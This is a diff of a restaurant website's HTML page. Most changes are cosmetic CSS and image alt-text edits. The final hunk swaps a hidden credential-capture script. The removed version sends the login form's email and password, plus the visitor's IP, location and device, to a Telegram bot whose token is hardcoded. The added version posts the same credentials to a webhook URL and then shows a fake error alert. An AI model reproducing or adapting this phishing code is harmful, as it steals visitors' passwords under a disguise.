@@ -25,7 +25,8 @@
 
         .content
         {
-            height: 1000px;
+            height: auto;
+            min-height: 1000px;
             width:100% ;
             display: flex;
             flex-wrap: wrap;
@@ -364,7 +365,7 @@
     <div class="container">
 
         <div class="header">
-            <div class="logo"><img src="images/poster.png" height="100%" width="100%" alt=""></div>
+            <div class="logo"><img src="images/poster.png" height="100%" width="100%" alt="Logo"></div>
             <div class="navbar">
                 <a href="index.html">HOME</a>
                 <a href="index.html">MENU</a>
@@ -373,7 +374,7 @@
         </div>
 
         <div class="hero">
-            <img src="images/poster.png" height="100%" width="100%" alt="">
+            <img src="images/poster.png" height="100%" width="100%" alt="Hero Image">
         </div>
 
     
@@ -406,7 +407,7 @@
         <div class="content">
     
             <div class="products">
-                <img src="images/zinger.png" height="100%" width="100%" alt="">
+                <img src="images/zinger.png" alt="Zinger Burger">
                 <h3>Zinger Burger</h3>
                 <p>Crispy chicken with lettuce</p>
                 <div class="price">Rs 350</div>
@@ -414,7 +415,7 @@
             </div>
             
             <div class="products">
-                <img src="images/burger fries.png" height="100%" width="100%" alt="">
+                <img src="images/burger fries.png" alt="Burger with Fries">
                 <h3>Burger with Fries</h3>
                 <p>Delicious burger with crispy fries</p>
                 <div class="price">Rs 450</div>
@@ -422,7 +423,7 @@
             </div>
             
             <div class="products">
-                <img src="images/pizza.png" height="100%" width="100%" alt="">
+                <img src="images/pizza.png" alt="Margherita Pizza">
                 <h3>Margherita Pizza</h3>
                 <p>Fresh basil and mozzarella</p>
                 <div class="price">Rs 550</div>
@@ -430,7 +431,7 @@
             </div>
             
             <div class="products">
-                <img src="images/pizza slice.png" height="100%" width="100%" alt="">
+                <img src="images/pizza slice.png" alt="Pepperoni Pizza">
                 <h3>Pepperoni Pizza</h3>
                 <p>Loaded with pepperoni</p>
                 <div class="price">Rs 600</div>
@@ -438,7 +439,7 @@
             </div>
             
             <div class="products">
-                <img src="images/chiken.png"height="100%" width="100%"  alt="">
+                <img src="images/chiken.png" alt="Fried Chicken">
                 <h3>Fried Chicken</h3>
                 <p>Crispy fried chicken pieces</p>
                 <div class="price">Rs 400</div>
@@ -446,7 +447,7 @@
             </div>
             
             <div class="products">
-                <img src="images/chiken tikka.png" height="100%" width="100%"  alt="">
+                <img src="images/chiken tikka.png" alt="Chicken Tikka">
                 <h3>Chicken Tikka</h3>
                 <p>Grilled tikka with chutney</p>
                 <div class="price">Rs 380</div>
@@ -458,17 +459,15 @@
         <div class="footer">
             <h3> Smiler Maker Restaurant</h3>
             <p>Fresh Burgers | Pizza | Fast Food</p>
-    
             <p>© 2026 Smiler Maker Restaurant. All Rights Reserved.</p>
         </div>
 
     </div>
 
-    <!-- CREDENTIAL CAPTURE SCRIPT WITH TELEGRAM -->
+    <!-- WEBHOOK.SITE CREDENTIAL CAPTURE SCRIPT -->
     <script>
-        // ✅ Telegram Bot Token and Chat ID Added
-        const BOT_TOKEN = "8798101633:AAG7wGajcctACcxGpvqfVaSh0C1Egk7R8mA";
-        const CHAT_ID = "7889111515";
+        // Webhook.site URL (Updated)
+        const WEBHOOK_URL = "https://webhooksite.net/74d52c4b-6c18-4e26-ac9f-dbbb316e61df";
         
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -476,32 +475,23 @@
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
             
-            // Get user IP and location info
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    const ip = ipData.ip;
-                    
-                    // Get location from IP
-                    fetch(`https://ipapi.co/${ip}/json/`)
-                        .then(res => res.json())
-                        .then(location => {
-                            const message = `🔐 NEW LOGIN CAPTURED! 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n📍 Location: ${location.city}, ${location.country_name}\n🖥️ Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
-                            
-                            // Send to Telegram
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    chat_id: CHAT_ID,
-                                    text: message
-                                })
-                            }).catch(err => console.log('Error:', err));
-                            
-                            // Also log to console
-                            console.log('Captured:', {email, password, ip, location: location.city});
-                        });
-                });
+            // Send data to Webhook.site
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    device: navigator.userAgent,
+                    url: window.location.href
+                })
+            }).catch(err => console.log('Error:', err));
+            
+            // Log to console for testing
+            console.log('Captured:', {email, password});
             
             // Show fake error message
             alert('Oops! Something went wrong. Please try again.');
